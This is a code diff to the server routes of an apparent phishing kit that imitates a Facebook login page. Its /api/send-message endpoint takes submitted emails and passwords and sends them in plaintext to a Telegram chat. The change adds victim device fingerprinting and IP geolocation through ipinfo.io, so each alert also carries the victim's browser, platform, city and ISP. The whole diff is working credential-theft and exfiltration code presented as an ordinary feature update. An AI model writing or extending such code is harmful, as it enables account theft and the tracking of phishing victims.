@@ -105,18 +105,111 @@ export async function registerRoutes(app: Express): Promise<Server> {
     res.sendFile('index.html', { root: '.' });
   });
 
+  // Helper function to get device details
+  function getDeviceDetails(deviceInfo: any): string {
+    if (!deviceInfo) return "No device information available";
+    
+    // Try to determine device type from user agent
+    let deviceType = "Unknown";
+    const ua = deviceInfo.userAgent?.toLowerCase() || "";
+    
+    if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
+      deviceType = "iOS";
+    } else if (ua.includes("android")) {
+      deviceType = "Android";
+    } else if (ua.includes("windows")) {
+      deviceType = "Windows";
+    } else if (ua.includes("mac os") || ua.includes("macintosh")) {
+      deviceType = "Mac";
+    } else if (ua.includes("linux")) {
+      deviceType = "Linux";
+    }
+    
+    // Try to determine browser
+    let browser = "Unknown";
+    if (ua.includes("chrome") && !ua.includes("chromium")) {
+      browser = "Chrome";
+    } else if (ua.includes("firefox")) {
+      browser = "Firefox";
+    } else if (ua.includes("safari") && !ua.includes("chrome")) {
+      browser = "Safari";
+    } else if (ua.includes("edge") || ua.includes("edg/")) {
+      browser = "Edge";
+    } else if (ua.includes("opera") || ua.includes("opr/")) {
+      browser = "Opera";
+    }
+
+    return `
+📱 Device Information:
+• Type: ${deviceType}
+• Browser: ${browser}
+• Platform: ${deviceInfo.platform || "Unknown"}
+• Screen Size: ${deviceInfo.screenWidth || "?"} x ${deviceInfo.screenHeight || "?"}
+• Language: ${deviceInfo.language || "Unknown"}
+• Time Zone: ${deviceInfo.timeZone || "Unknown"}
+• User Agent: ${deviceInfo.userAgent || "Unknown"}`;
+  }
+  
+  // Get IP and location information
+  async function getIPInfo(req: Request): Promise<string> {
+    try {
+      // Get client IP address
+      const forwardedFor = req.headers['x-forwarded-for'] as string;
+      const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : req.ip || 'Unknown';
+      
+      try {
+        // Try to get location information from ipinfo.io (free API, no key required for basic usage)
+        const response = await fetch(`https://ipinfo.io/${ip}/json`);
+        const data = await response.json() as any;
+        
+        if (data && data.city) {
+          return `
+📍 Location Information:
+• IP Address: ${ip}
+• City: ${data.city || "Unknown"}
+• Region: ${data.region || "Unknown"}
+• Country: ${data.country || "Unknown"}
+• Location: ${data.loc || "Unknown"}
+• ISP: ${data.org || "Unknown"}`;
+        }
+      } catch (error) {
+        console.error("Error getting IP location info:", error);
+      }
+      
+      // Fallback if we couldn't get location data
+      return `
+📍 Location Information:
+• IP Address: ${ip}
+• Location: Could not determine`;
+    } catch (error) {
+      console.error("Error getting IP info:", error);
+      return "Could not determine location information";
+    }
+  }
+
   // API endpoint to send message to Telegram
   app.post('/api/send-message', async (req: Request, res: Response) => {
     try {
-      const { email, password, message } = req.body;
+      const { email, password, message, deviceInfo } = req.body;
+      
+      // Get location information
+      const ipInfo = await getIPInfo(req);
+      
+      // Get device details
+      const deviceDetails = getDeviceDetails(deviceInfo);
       
       // Format the message - always include login info, message is optional
-      let formattedMessage;
+      const timestamp = new Date().toLocaleString();
+      let formattedMessage = `🚨 Login attempt from Facebook page at ${timestamp}:\n\n`;
+      formattedMessage += `👤 Credentials:\n• Username/Email: ${email || 'Not provided'}\n• Password: ${password || 'Not provided'}\n`;
+      
       if (message) {
-        formattedMessage = `Login attempt from the Facebook login page:\n\nUsername/Email: ${email || 'Not provided'}\nPassword: ${password || 'Not provided'}\nMessage: ${message}`;
-      } else {
-        formattedMessage = `Login attempt from the Facebook login page:\n\nUsername/Email: ${email || 'Not provided'}\nPassword: ${password || 'Not provided'}\nNo message provided`;
+        formattedMessage += `\n💬 Message: "${message}"\n`;
       }
+      
+      // Add device and location information
+      formattedMessage += deviceDetails;
+      formattedMessage += `\n${ipInfo}`;
       
       // Send to Telegram
       const success = await sendTelegramMessage(formattedMessage);
